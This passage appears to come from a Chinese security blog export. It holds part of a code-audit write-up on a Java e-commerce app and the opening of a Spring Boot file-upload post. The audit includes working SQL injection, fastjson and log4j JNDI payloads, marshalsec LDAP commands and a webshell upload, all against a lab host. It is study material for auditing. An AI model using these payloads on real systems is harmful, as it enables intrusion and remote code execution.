alt=\"image\"></p>\n<p>product_name_split &#x3D; product_name.split(“ “);</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">product_name 不为空</span><br></pre></td></tr></table></figure>\n<p>分析得知：product_name_split 是通过空格去匹配来切割product_name传入的参数的值来分隔的</p>\n<p><strong>.split</strong>：可以根据匹配给定的正则表达式来拆分字符串</p>\n<p>所以传入的参数需要传入两个，并且使用空格分隔。最终得到的payload</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">/tmall/product/0/20?orderBy=%31%20%41%4e%44%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%28%73%65%6c%65%63%74%20%28%73%6c%65%65%70%28%35%29%29%29%6d%73%63%70%29&amp;isDesc=true&amp;category_id=2&amp;category_id=3&amp;product_name=%71%77%65%2c%61%73%64%20%7a%78%63</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">/tmall/product/0/20?orderBy=1 AND (select 1 from (select (sleep(5)))mscp)&amp;isDesc=true&amp;category_id=2&amp;category_id=3&amp;product_name=qwe,asd zxc</span><br></pre></td></tr></table></figure>\n<p><img src=\"S5Yz-EHBh8WNg554WYGuoUzqyYWGPaUN7DBpnf9Xqlc.png\" alt=\"image\"></p>\n<h4 id=\"SQL注入总结\"><a href=\"#SQL注入总结\" class=\"headerlink\" title=\"SQL注入总结\"></a>SQL注入总结</h4><p>本系统共审计发现6个SQL注入点且均已验证确认。下面是详细的污点传播链。</p>\n<ul>\n<li>SQL注入1：<br>RewardController(97)–&gt;RewardService.getList–&gt;RewardMapper.select –&gt;RewardMapper.xml(${orderUtil.orderBy})</li>\n<li>SQL注入2：<br>  ForeProductListController(163)–&gt; ProductService.getMoreList–&gt;ProductMapper.selectMoreList–&gt;  ProductMapper.xml(${orderUtil.orderBy})</li>\n<li>SQL注入3：<br>ProductController(405)–&gt;ProductService.getList–&gt; ProductMapper.select–&gt;  ProductMapper.xml(${orderUtil.orderBy})</li>\n<li>SQL注入4：<br>ForeProductListController(168)–&gt;ProductService.getList–&gt; ProductMapper.select–&gt;ProductMapper.xml(${orderUtil.orderBy})</li>\n<li>SQL注入5：<br>OrderController(176)–&gt;ProductOrderService.getList–&gt;ProductOrderMapper.select–&gt;ProductOrderService.xml(${orderUtil.orderBy})</li>\n<li>SQL注入6：<br>UserController(170)–&gt; UserService.getList–&gt;UserMapper.select–&gt;UserMapper.xml(${orderUtil.orderBy})</li>\n</ul>\n<p><img src=\"34NeD_tT0kwQbDrFJRE_QOjITFE0pW5d9lUxJk46GdY.png\" alt=\"image\"></p>\n<h3 id=\"XSS-反射\"><a href=\"#XSS-反射\" class=\"headerlink\" title=\"XSS(反射)\"></a>XSS(反射)</h3><ul>\n<li>requestScope：是EL表达式中的一个隐含对象，类似request，如：${requestScope.username} 表示在request域中取得username属性所对应的值</li>\n</ul>\n<p>搜索requestScope、map.put。</p>\n<p>触发链：ForeProductListController拿到了product_name后赋值给searchValue，未做处理之后直接map.put传到了request域，转到fore&#x2F;productListPage。</p>\n<p>链为：前端传参–&gt;ForeProductListController–&gt;获取参数–&gt;传到前端–&gt;展示（触发）</p>\n<p><img src=\"l2l6pMOC1jtn27Xp40uLZxt78j7BHP2Np46Kt31_6bA.png\" alt=\"image\"></p>\n<p>productListPage页面直接调用</p>\n<p><img src=\"XKRQ5fGyAcQ6Oyn6prR1mFeqgc7rg_efCoqkIpoAtVk.png\" alt=\"image\"></p>\n<p>验证</p>\n<p><img src=\"2h3pLjkdR6tzagmMau4Pkb9iIpI1gv7-dHFXlpnKN4s.png\" alt=\"image\"></p>\n<p><img src=\"RIWBAYLT2bE54OXw3PovYEUck53NunG-qcPDtzo6nAU.png\" alt=\"image\"></p>\n<h3 id=\"XSS（存储）\"><a href=\"#XSS（存储）\" class=\"headerlink\" title=\"XSS（存储）\"></a>XSS（存储）</h3><p>注册账号</p>\n<p>控制层拿到传入的user_name</p>\n<p><img src=\"NKIT6LiKZqM12dhte7k7ROSZXik3QcKOPqqlS4pl-z4.png\" alt=\"image\"></p>\n<p>创建用户对象，然后将用户对象传入到service层</p>\n<p><img src=\"oa6gt_8VHLNP-34_WdjujK0C2k9aoggYOy4U30bbUQU.png\" alt=\"image\"></p>\n<p>service调用dao层的接口</p>\n<p><img src=\"GOusN-7mvd-I0Ieeq2K72oFuq4IQdFLjrBhowtCD8Wo.png\" alt=\"image\"></p>\n<p><img src=\"ZA_N5lFepeyPq3aMnxLlfnB9ME77u-zBs9lJ9MhR1_c.png\" alt=\"image\"></p>\n<p>最终到了xml配置文件，执行SQL语句的地方，成功插入数据。</p>\n<p><img src=\"7xInJKQWGyGNz4JZenh61qxTRa2wAJZcfHpzHO2j_M0.png\" alt=\"image\"></p>\n<p>burp验证。</p>\n<p><img src=\"Zpu9O9AW14VXKYEx7BzYkQDW5-xwY3PYBZyDk4wYp5s.png\" alt=\"image\"></p>\n<p>看了下数据表，只要名字的长度不超过25就不会报错，不然报服务器500的错误。</p>\n<p><img src=\"Uih_0Rrw4zcFt1tR6nHq-cNJ5EnpoV7lvz3rwcs2R8Q.png\" alt=\"image\"></p>\n<p>登录账号之后触发。有一个页面是去获取数据库中存储的用户名的。所以登录之后直接出发XSS。</p>\n<p><img src=\"URvs16uQc_xgZ63ndFX3e_dWHCTLUd6Ako53blYkBJw.png\" alt=\"image\"></p>\n<p>触发链：</p>\n<p>访问tmall&#x2F;login，即可访问到ForeLoginController控制层的login，重定向到 fore&#x2F;loginPage</p>\n<p><img src=\"b4ufrbzQy2x1NNy3RjihfaBjnrIq7nFLYyWvq-bMoaQ.png\" alt=\"image\"></p>\n<p>登录页面的loginPage.jsp</p>\n<p><img src=\"Zoz2dHy4yuIJqg7zDzSdPSa282T6zWwUpYWbK8d6nqI.png\" alt=\"image\"></p>\n<p>调用了fore_login.js；如果后端响应返回成功，则访问&#x2F;tmall</p>\n<p><img src=\"7xY6hv2tiXTz0c0gGRYRa_W9rQZNGeecvgduRWflQU0.png\" alt=\"image\"></p>\n<p>登录成功返回</p>\n<p><img src=\"1rLYOoBiy_GcuM6mYL5R-Il8_O-bLqZDmTQJ8DakTPE.png\" alt=\"image\"></p>\n<p>主页，取出前面登录成功存进去的userId，判断用户是否登录。如果已经登录则把整改user对象传到Request。map.put(“user”, user)；其中user对象的数据会调用service层的userService.get，service会调用dao的userMapper.selectOne，selectOne去数据库根据这个userId查询信息。返回后封装成User对象。</p>\n<p><img src=\"0HfOGkNMdZwCSNwAIPyYOkjrtm4I-V9v9_Qh1X59M9A.png\" alt=\"image\"></p>\n<p>执行完上面的之后，跳转到fore&#x2F;homePage；homePage里面又包含了navigator.jsp</p>\n<p><img src=\"_16A5IdHxBc5eMux8NY-ORAkXOKUFKpPN0kulPfqTF0.png\" alt=\"image\"></p>\n<p>navigator.jsp触发</p>\n<p><img src=\"3TSQXgEcJ9Y56MH6f9rwmdLFzuBqf9_n_OLr_vL0gFo.png\" alt=\"image\"></p>\n<h3 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h3><h4 id=\"文件上传1\"><a href=\"#文件上传1\" class=\"headerlink\" title=\"文件上传1\"></a>文件上传1</h4><p>全局搜索upload</p>\n<p><img src=\"5jCZfY_15FLJfaHu_nYLsj3Fs4II2jM7wEaQdG7F1uc.png\" alt=\"image\"></p>\n<p>发现头像上传的controller，且不存在过滤。</p>\n<p>通过post上传文件，调用UUID随机数重命名文件之后直接保存到了res&#x2F;images&#x2F;item&#x2F;userProfilePicture&#x2F;目录，上传成功之后JSON格式返回状态以及文件名称。</p>\n<p>未对所上传的文件进行类型已经文件后缀校验，存在任意文件上传漏洞。</p>\n<p><img src=\"FEO_t3JVm1MSKbCCnAEVqHkXug_dZSXRM19zKwq4p2Q.png\" alt=\"image\"></p>\n<p>前台用户头像更换处</p>\n<p><img src=\"gtuL_Fd7R3Y9UBVUQfUQ95qZ8Mxwop9L8wsna-vRXFw.png\" alt=\"image\"></p>\n<p>使用蚁剑生成一个jsp的webshell，直接粘贴到bp进行上传。</p>\n<p><img src=\"zyqZl6Hpyqp_kKx0ucpJOI0vMhl3DY3Afjm-UQYdnwU.png\" alt=\"image\"></p>\n<p>连接URL：<a href=\"http://192.168.75.154:8090/tmall/res/images/item/userProfilePicture/e1dd8f9e-25bb-4d14-be97-0f378c49cdf9.jsp\">http://192.168.75.154:8090/tmall/res/images/item/userProfilePicture/e1dd8f9e-25bb-4d14-be97-0f378c49cdf9.jsp</a></p>\n<p>因为有个统一的前缀&#x2F;tmall，所以这个别忘记加上。</p>\n<p><img src=\"yVEiAhYiisiCH01WYjOZrZ2E1s-nrtg5PF5OE-TB5cU.png\" alt=\"image\"></p>\n<p><img src=\"7_XtDcER1-ZWdDXck5QA6j8INlOkYqetQ1HyoaY0m0E.png\" alt=\"image\"></p>\n<p>本项目存在4个文件上传点，且都可以进行getshell</p>\n<h4 id=\"文件上传2\"><a href=\"#文件上传2\" class=\"headerlink\" title=\"文件上传2\"></a>文件上传2</h4><p><img src=\"xZXCYI_skzpX3QvocLJBXgFYyF3hRuQbH98Y9jn5V0Y.png\" alt=\"image\"></p>\n<p><img src=\"4ZofkFAmvbWezVylXq4xRNNmv_Y22Vxb-u86IPZj2tQ.png\" alt=\"image\"></p>\n<p><img src=\"ZS3wfYz4GyRSD9nyWHgc-yOm4LpK4UFIHXEgLWfL5-U.png\" alt=\"image\"></p>\n<p><img src=\"rkTgEsjpNY2ExjI9SODeeVdhLa8F0p3dMRVvL8wfXjc.png\" alt=\"image\"></p>\n<h4 id=\"文件上传3\"><a href=\"#文件上传3\" class=\"headerlink\" title=\"文件上传3\"></a>文件上传3</h4><p>管理员头像上传</p>\n<p><img src=\"AQOXXqxaeV20vD5v1eEZpqRfTeityFJpqsV_H0uJS3U.png\" alt=\"image\"></p>\n<h4 id=\"文件上传4\"><a href=\"#文件上传4\" class=\"headerlink\" title=\"文件上传4\"></a>文件上传4</h4><p>添加产品处</p>\n<p><img src=\"g9BcswcLx3jFva0uCDLFfA1xwyuIRtd6fYdJhiwKAdk.png\" alt=\"image\"></p>\n<p><img src=\"_1a6Wed9yFY01DSimi-fbRq6NJQAQibnsuldmak_7oM.png\" alt=\"image\"></p>\n<h3 id=\"CSRF\"><a href=\"#CSRF\" class=\"headerlink\" title=\"CSRF\"></a>CSRF</h3><p>因项目没有其他过滤器校验Referer头，所以全局存在CSRF漏洞。</p>\n<p><img src=\"fyPyjMeHGyB3foieSIReNHa1W9KCNJXxT-daiXnhVjM.png\" alt=\"image\"></p>\n<p>验证</p>\n<p><img src=\"eXXiTbZ9W-O0Wh2kDRWgePYpPdhMgTU8FyJTi-SoAOE.png\" alt=\"image\"></p>\n<p><img src=\"EBdNXwilm1WtChdps91ukf0QHViF8COp_7BXj7bTpwY.png\" alt=\"image\"></p>\n<h3 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h3><p>搜索全局未发现可能引起SSRF的危险函数。</p>\n<h2 id=\"框架漏洞\"><a href=\"#框架漏洞\" class=\"headerlink\" title=\"框架漏洞\"></a>框架漏洞</h2><h3 id=\"fastjson\"><a href=\"#fastjson\" class=\"headerlink\" title=\"fastjson\"></a>fastjson</h3><p>拿到源码的时候，fastjson使用的是1.2.83版本；这个版本目前暂时安全。为了好玩一点，我们可以把版本降低一点来进行fastjson的反序列化攻击测试，我这里就直接改为了1.2.24。（当然这不算属于这个源码本身的漏洞，只是学习把版本降低进行测试。）</p>\n<p>搜索关键字JSON.parseObject（Json字符串转化为相应的对象）</p>\n<p><img src=\"suZ-Aty_CIAkbjBfk-Pj7-Ao2efd0RltOmKtrS98bkU.png\" alt=\"image\"></p>\n<p>更新产品属性的地方进行了JSON.parseObject（添加产品属性的地方也进行了JSON.parseObject）,没进行过滤，从前端获取到数据，直接传给JSON.parseObject。</p>\n<p><img src=\"uBjFPdMakVMEl9o-pAJ2ULEXEAdjCOkhASHx0FgChZ4.png\" alt=\"image\"></p>\n<p><img src=\"jZqZfxwvhLu7UKS8txMiIGs3MrBdqaXPDPQc-VPAOFE.png\" alt=\"image\"></p>\n<p><img src=\"yw8P6P4QKiSBqlSx-MN6j2i7lNxA9iNjZvbiZ3QKudY.png\" alt=\"image\"></p>\n<p>进行dnslog探测</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;garck3h&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;java.net.Inet4Address&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;val&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;666.eyle20.dnslog.cn&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"bYxVeXTjTX5cbZCkonJGRrfsx0aaAkTDcOvCTH7q3W4.png\" alt=\"image\"></p>\n<p><img src=\"dh6UpVpgr4kuOPU_LT9OgRDSZuV-cd8KSnaAZdjn8TU.png\" alt=\"image\"></p>\n<p>使用BCEL进行本地序列化成功弹计算器。</p>\n<p><img src=\"f8WcV8-fjogKnEk4fjhBaV3kpGhxfPYQeSo8-o1j2Mc.png\" alt=\"image\"></p>\n<p>使用Spring做回显，成功执行命令并且回显</p>\n<p><img src=\"CWCpnsfSkPTl3QqcCuOSNNnGg52aciyLi9y5UZVvGN0.png\" alt=\"image\"></p>\n<p>此外该系统还有其他功能点存在该漏洞</p>\n<h3 id=\"log4j2\"><a href=\"#log4j2\" class=\"headerlink\" title=\"log4j2\"></a>log4j2</h3><p>这里的log4j是2.20版本，属于安全版本。我改一下为2.14版本。测试一下log4j漏洞。</p>\n<p><img src=\"lAcfIK-Ol9vPNWWft8Y6JMJclVva5BZ7aGbYpNIF1p0.png\" alt=\"image\"></p>\n<p>全局搜索：logger.info；发现一个orderBy是可控的</p>\n<p><img src=\"M15QiIJCXqhwFSx95jCZ2-MAEybA7RHhxOs6lgXOW9E.png\" alt=\"image\"></p>\n<p><img src=\"Mo_LiEFaWsRyArUngTNoln12ZkF7YFHYEC6MqQnULn8.png\" alt=\"image\"></p>\n<p>使用dnslog进行探测，成功接收到请求。</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">$<span class=\"punctuation\">&#123;</span>jndi<span class=\"punctuation\">:</span>ldap<span class=\"punctuation\">:</span><span class=\"comment\">//log4j.15k855.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"oMwirlis5rJehQMpkWYkxgGXtL1DQ3xt7a5VYckIJ_Q.png\" alt=\"image\"></p>\n<p><img src=\"p4H9naK8RBGr9E6NMItnUf3tviG3yQma81LE7Ba4zuw.png\" alt=\"image\"></p>\n<p>进行JNDI注入：</p>\n<p>写好的弹计算器的payload，然后使用Javac TestCmd.java进行编译</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestCmd</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">       <span class=\"type\">TestCmd</span> <span class=\"variable\">qwe</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TestCmd</span>();</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用marshalsec-0.0.3-SNAPSHOT-all.jar起ldap服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -<span class=\"built_in\">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class=\"string\">&quot;http://127.0.0.1:8888/#TestCmd&quot;</span></span><br></pre></td></tr></table></figure>\n<p>使用python3起http服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>\n<p>payload</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$&#123;jndi:ldap://192.168.75.154:1389/a&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"UW1eunoi1rK7JLYjRF1XDxEWG5eWa23k0cbZviLPtKE.png\" alt=\"image\"></p>\n<p>此外该系统还有其他功能点存在该漏洞</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>因为本次的mysql是部署在Linux服务器的，Linux区分大小写，但SQL文件里面的一些表名称是小写的，会导致表名不对，根据控制台提示进行修改即可。</li>\n<li>遇到错误“this is incompatible with sql_mode&#x3D;only_full_group_by ”；因为mysql 5.7.5版本以上默认的sql配置是:sql_mode&#x3D;“ONLY_FULL_GROUP_BY”。由于开启了ONLY_FULL_GROUP_BY的设置，如果select 的字段不在 group by 中，并且select 的字段未使用聚合函数（SUM,AVG,MAX,MIN等）的话，那么这条sql查询是被mysql认为非法的，会报错误。</li>\n<li>这项目不复杂，都是一些比较常规常见的漏洞，而且调用关系也清晰，审计起来比较轻松。该系统或还有一些没有挖掘的漏洞，望师傅们勿喷。</li>\n</ul>\n","categories":["代码审计"],"tags":["代码审计","Java安全"]},{"title":"SpringBoot框架文件上传的Trick","url":"/2023/06/04/SpringBoot%E6%A1%86%E6%9E%B6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84Trick/","content":"<h1 id=\"SpringBoot框架文件上传的Trick\"><a href=\"#SpringBoot框架文件上传的Trick\" class=\"headerlink\" title=\"SpringBoot框架文件上传的Trick\"></a>SpringBoot框架文件上传的Trick</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Spring Boot 是一款基于 Spring 框架的快速开发 Web 应用的工具。它提供了很多功能强大的框架和引擎，如 Thymeleaf、Freemarker、Mustache 等，能够帮助开发者高效、便捷地实现各种需求。与其它框架不同的是，Spring Boot 应用程序默认不解析 JSP 页面。而且tomcat中间件大多数都是嵌入在jar里面的。虽然这导致在灵活性和可扩展性方面具有优势，但如果没有适当的措施来处理上传文件的内容，就会给恶意用户提供机会，利用此漏洞获取系统权限，甚至造成数据泄露等严重后果。</p>\n<h2 id=\"demo分析\"><a href=\"#demo分析\" class=\"headerlink\" title=\"demo分析\"></a>demo分析</h2><h3 id=\"创建一个springboot项目\"><a href=\"#创建一个springboot项目\" class=\"headerlink\" title=\"创建一个springboot项目\"></a>创建一个springboot项目</h3><p>创建一个工程</p>\n<p><img src=\"5DmosnH-tD3mC-N-ioN7tJQBcKtBt0JPWyjhVMb0f5w.png\" alt=\"image\"></p>\n<p>FileUploadHazards</p>\n<p><img src=\"b3lrSaAlhzIEXKcmYzLvVuZQGYF_ZdsIqy62q5V5nos.png\" alt=\"image\"></p>\n<p><img src=\"h1mC7F40eZwUsfG12qasbTN4h-cd97EXAlPHBYtHT3E.png\" alt=\"image\"></p>\n<p>创建Java文件夹</p>\n<p><img src=\"er7fUH0g_Q1SpDLVKEyVZLwqnPjk8BF4Rlx_nPYm8dk.png\" alt=\"image\"></p>\n<h3 id=\"配置springboot\"><a href=\"#配置springboot\" class=\"headerlink\" title=\"配置springboot\"></a>配置springboot</h3><p>配置pom.xml</p>\n<p>放在 里面</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!-- 继承父包 --&gt;</span><br><span class=\"line\">  &lt;parent&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;2.0.7.RELEASE&lt;/version&gt;</span><br><span class=\"line\">  &lt;/parent&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;dependencies&gt;</span><br><span class=\"line\">    &lt;!-- web启动jar --&gt;</span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">      &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;</span><br><span class=\"line\">      &lt;artifactId&gt;lombok&lt;/artifactId&gt;</span><br><span class=\"line\">      &lt;version&gt;1.18.6&lt;/version&gt;</span><br><span class=\"line\">      &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\"> &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>\n<p>放在  <build>里面</build></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;resources&gt;</span><br><span class=\"line\">  &lt;resource&gt;</span><br><span class=\"line\">    &lt;directory&gt;src/main/resources&lt;/directory&gt;</span><br><span class=\"line\">    &lt;includes&gt;</span><br><span class=\"line\">      &lt;include&gt;**/*.*&lt;/include&gt;</span><br><span class=\"line\">    &lt;/includes&gt;</span><br><span class=\"line\">    &lt;filtering&gt;<span class=\"literal\">true</span>&lt;/filtering&gt;</span><br><span class=\"line\">  &lt;/resource&gt;</span><br><span class=\"line\">&lt;/resources&gt;</span><br></pre></td></tr></table></figure>\n<p>完整的pom.xml</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;project xmlns=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> xmlns:xsi=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class=\"line\">  xsi:schemaLocation=<span class=\"string\">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class=\"line\">  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class=\"line\">  &lt;artifactId&gt;FileUploadHazards&lt;/artifactId&gt;</span><br><span class=\"line\">  &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\">  &lt;packaging&gt;war&lt;/packaging&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;name&gt;FileUploadHazards Maven Webapp&lt;/name&gt;</span><br><span class=\"line\">  &lt;!-- FIXME change it to the project<span class=\"string\">&#x27;s website --&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;url&gt;http://www.example.com&lt;/url&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">  &lt;properties&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;maven.compiler.source&gt;1.7&lt;/maven.compiler.source&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;maven.compiler.target&gt;1.7&lt;/maven.compiler.target&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;/properties&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">  &lt;!-- 继承父包 --&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;parent&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;version&gt;2.0.7.RELEASE&lt;/version&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;/parent&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">  &lt;dependencies&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;!-- web启动jar --&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;dependency&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/dependency&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    &lt;dependency&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;artifactId&gt;lombok&lt;/artifactId&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;version&gt;1.18.6&lt;/version&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;scope&gt;provided&lt;/scope&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/dependency&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    &lt;dependency&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;groupId&gt;junit&lt;/groupId&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;artifactId&gt;junit&lt;/artifactId&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;version&gt;4.11&lt;/version&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;scope&gt;test&lt;/scope&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/dependency&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;/dependencies&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">  &lt;build&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;finalName&gt;FileUploadHazards&lt;/finalName&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;pluginManagement&gt;&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;plugins&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;plugin&gt;</span></span><br><span class=\"line\"><span class=\"string\">          &lt;artifactId&gt;maven-clean-plugin&lt;/artifactId&gt;</span></span><br><span class=\"line\"><span class=\"string\">          &lt;version&gt;3.1.0&lt;/version&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;/plugin&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;plugin&gt;</span></span><br><span class=\"line\"><span class=\"string\">          &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt;</span></span><br><span class=\"line\"><span class=\"string\">          &lt;version&gt;3.0.2&lt;/version&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;/plugin&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;plugin&gt;</span></span><br><span class=\"line\"><span class=\"string\">          &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span></span><br><span class=\"line\"><span class=\"string\">          &lt;version&gt;3.8.0&lt;/version&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;/plugin&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;plugin&gt;</span></span><br><span class=\"line\"><span class=\"string\">          &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;</span></span><br><span class=\"line\"><span class=\"string\">          &lt;version&gt;2.22.1&lt;/version&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;/plugin&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;plugin&gt;</span></span><br><span class=\"line\"><span class=\"string\">          &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt;</span></span><br><span class=\"line\"><span class=\"string\">          &lt;version&gt;3.2.2&lt;/version&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;/plugin&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;plugin&gt;</span></span><br><span class=\"line\"><span class=\"string\">          &lt;artifactId&gt;maven-install-plugin&lt;/artifactId&gt;</span></span><br><span class=\"line\"><span class=\"string\">          &lt;version&gt;2.5.2&lt;/version&gt;</span></span><br><span 